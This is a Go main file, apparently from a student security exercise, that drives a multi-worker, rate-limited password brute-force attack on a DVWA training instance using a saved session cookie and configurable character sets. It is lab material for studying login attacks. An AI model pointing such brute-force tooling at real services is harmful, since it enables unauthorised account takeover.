package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"time"
)

const cookiesPath = "/Users/maxim/study/beza/pr4/task1/cookies.txt"
const workers = 6
const requestsPerSecond = 100

func run(ctx context.Context) int {
	charsetName := flag.String("charset", "digits", "алфавит: digits, lower, alnum, printable")
	minLength := flag.Int("min-length", 1, "минимальная длина пароля")
	maxLength := flag.Int("max-length", 4, "максимальная длина пароля")

	flag.Parse()

	fail := func(err error) int {
		reportError(err)

		return 2
	}

	if flag.NArg() != 0 {
		return fail(fmt.Errorf("лишние позиционные аргументы; см. -h"))
	}

	charset, err := ResolveCharset(*charsetName)

	if err != nil {
		return fail(err)
	}

	cfg, err := NewConfig(charset, *minLength, *maxLength, workers)

	if err != nil {
		return fail(err)
	}

	session, err := readSession(cookiesPath)

	if err != nil {
		return fail(err)
	}

	target := newDVWA(session, workers)

	defer target.client.CloseIdleConnections()

	if err := target.validateSession(ctx); err != nil {
		return fail(err)
	}

	fmt.Printf("Адрес: %s\nЛогин: %s\nУровень: Low\nРаботников: %d\nКомбинаций: %d\n", endpoint, username, workers, cfg.Total)
	fmt.Printf("Общий лимит: %d запросов/с\n", requestsPerSecond)
	fmt.Println("Перебор начат. Ctrl+C — остановка.")

	// Один таймер на всех работников: одно разрешение каждые 10 мс.
	ticker := time.NewTicker(time.Second / requestsPerSecond)

	defer ticker.Stop()

	target.pace = ticker.C
	value, err := search(ctx, cfg, target)

	fmt.Printf("Статус: %s\nПопыток: %d\nВремя: %s\n", value.Status, value.Attempts, value.Elapsed)

	if value.Elapsed > 0 {
		fmt.Printf("Скорость: %.2f попыток/с\n", float64(value.Attempts)/value.Elapsed.Seconds())
	}

	if value.Status == "found" {
		fmt.Printf("Пароль: %s\n", value.Password)
	}

	if errors.Is(err, context.Canceled) {
		return 130
	}

	if err != nil {
		return fail(err)
	}

	return 0
}

func main() {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	code := run(ctx)

	stop()
	os.Exit(code)
}
